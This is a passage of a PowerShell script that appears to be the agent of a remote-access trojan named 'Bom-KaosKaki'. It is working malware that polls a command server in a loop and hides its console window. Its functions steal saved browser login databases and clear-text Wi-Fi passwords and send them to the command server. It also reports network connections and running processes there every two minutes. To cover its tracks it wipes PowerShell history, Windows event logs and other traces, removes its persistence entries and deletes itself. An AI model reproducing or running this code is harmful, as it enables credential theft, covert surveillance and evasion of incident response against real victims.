    if ($Script:SpywareRunning) { return "Spyware already running" }
    $Script:SpywareRunning = $true
    $Script:SpywareJob = Start-Job -ScriptBlock {
        param($sessionId, $c2Server)
        while ($true) {
            try {
                $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | 
                Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
                Where-Object { $_.RemoteAddress -notin @("127.0.0.1", "::1") } | Select-Object -First 20
                if ($connections) {
                    $payload = @{ session_id = $sessionId; type = "spyware_connections"; data = ($connections | ConvertTo-Json -Compress); timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") }
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
                }
                $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, CPU, WorkingSet, StartTime
                $payload2 = @{ session_id = $sessionId; type = "spyware_processes"; data = ($procs | ConvertTo-Json -Compress); timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") }
                $webClient2 = New-Object System.Net.WebClient
                $webClient2.Headers.Add("Content-Type", "application/json")
                $webClient2.UploadString("$c2Server/api/exfil", ($payload2 | ConvertTo-Json -Compress)) | Out-Null
            }
            catch {}
            Start-Sleep -Seconds 120
        }
    } -ArgumentList $Script:SessionId, $C2Server
    return "Spyware monitoring started (network connections + top processes every 2 min)"
}

function Invoke-CleanTraces {
    param($cmd)
    $cleaned = @()
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue; $cleaned += "powershell_history" } catch {}
    try { wevtutil cl "Windows PowerShell" 2>$null; wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null; wevtutil cl "Security" 2>$null; wevtutil cl "System" 2>$null; wevtutil cl "Application" 2>$null; $cleaned += "event_logs" } catch {}
    try { Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue; $cleaned += "temp_files" } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue; $cleaned += "recent_files" } catch {}
    try { Remove-Item "$env:WINDIR\Prefetch\*" -Force -ErrorAction SilentlyContinue; $cleaned += "prefetch" } catch {}
    try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::Clear(); $cleaned += "clipboard" } catch {}
    try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue; $cleaned += "run_mru" } catch {}
    $result = @{ cleaned = $cleaned }
    Send-ExfilData -Type "clean" -Data $result
    return "Cleaned: $($cleaned -join ', ')"
}

function Invoke-StealBrowser {
    param($cmd)
    $browsers = @(
        @{path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; name = "Chrome" },
        @{path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; name = "Edge" },
        @{path = "$env:APPDATA\Opera Software\Opera Stable\Login Data"; name = "Opera" },
        @{path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; name = "Brave" }
    )
    $results = @()
    foreach ($browser in $browsers) {
        if (Test-Path $browser.path) {
            try {
                $tempFile = "$env:TEMP\login_data_$($browser.name)_$([Guid]::NewGuid().Guid).db"
                Copy-Item $browser.path $tempFile -Force
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                Send-ExfilData -Type "browser" -Data @{ browser = $browser.name; file = [Convert]::ToBase64String($bytes); size = $bytes.Length }
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                $results += @{ browser = $browser.name; stolen = $true; size = $bytes.Length }
            }
            catch { $results += @{ browser = $browser.name; error = $_.Exception.Message; stolen = $false } }
        }
        else { $results += @{ browser = $browser.name; stolen = $false; reason = "Not installed" } }
    }
    return ($results | ConvertTo-Json -Compress)
}

function Invoke-StealWiFi {
    param($cmd)
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
    $wifiData = @()
    foreach ($wifiProfile in $profiles) {
        try {
            $details = netsh wlan show profile name="$wifiProfile" key=clear
            $password = ($details | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
            $auth = ($details | Select-String "Authentication" | Select-Object -First 1 | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
            $wifiData += @{ ssid = $wifiProfile; password = if ($password) { $password } else { "(open network)" }; auth = if ($auth) { $auth } else { "Unknown" } }
        }
        catch { $wifiData += @{ ssid = $wifiProfile; password = "(error reading)"; error = $_.Exception.Message } }
    }
    $result = @{ networks = $wifiData; count = $wifiData.Count }
    Send-ExfilData -Type "wifi" -Data $result
    return ($result | ConvertTo-Json -Compress)
}

function Invoke-Uninstall {
    param($cmd)
    $null = Invoke-CleanTraces $cmd
    try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
    try { Unregister-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.bat" -Force -ErrorAction SilentlyContinue } catch {}
    Stop-Keylogger $cmd
    if ($Script:SpywareJob) { try { $Script:SpywareJob | Stop-Job -Force; $Script:SpywareJob | Remove-Job -Force } catch {}; $Script:SpywareRunning = $false }
    Send-ExfilData -Type "uninstall" -Data @{ status = "uninstalled"; session_id = $Script:SessionId }
    $scriptPath = (Get-Process -Id $PID).Path
    $deleteScript = "Start-Sleep -Seconds 2; Remove-Item -Path '$scriptPath' -Force; Stop-Process -Id $PID -Force"
    Start-Job -ScriptBlock ([ScriptBlock]::Create($deleteScript))
    return "Uninstalling. Goodbye."
}

# ============ MAIN C2 LOOP ============
function Start-C2Communication {
    param([switch]$Force)
    $now = Get-Date
    if ($Force -or (($now - $Script:LastHeartbeat).TotalSeconds -ge $HeartbeatInterval)) { Send-Heartbeat -Force }
    if ($Force -or (($now - $Script:LastCommandPoll).TotalSeconds -ge $PollInterval)) { $Script:LastCommandPoll = $now; Invoke-CommandPoll }
}

function Invoke-Main {
    if (-not $Script:SessionId) {
        $Script:SessionId = Get-SessionId
        # Write-Host "[+] Session ID: $Script:SessionId" -ForegroundColor Green
    }
    # Write-Host "[+] Bom-KaosKaki Agent Started" -ForegroundColor Green
    # Write-Host "[+] C2 Server: $C2Server" -ForegroundColor Cyan
    # Write-Host "[+] Poll Interval: ${PollInterval}s | Heartbeat: ${HeartbeatInterval}s" -ForegroundColor Cyan
    Send-Heartbeat -Force
    while ($true) { Start-C2Communication; Start-Sleep -Seconds 5 }
}

# ============ ENTRY POINT ============
try {
    $consoleHandle = (Get-Process -Id $PID).MainWindowHandle
    if ($consoleHandle -and $consoleHandle -ne 0) {
        $typeDef = @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@
        $showWindowAsync = Add-Type -MemberDefinition $typeDef -Name "Win32Show" -Namespace "Win32" -PassThru
        $showWindowAsync::ShowWindowAsync($consoleHandle, 0) | Out-Null
    }
}
catch { }

Invoke-Main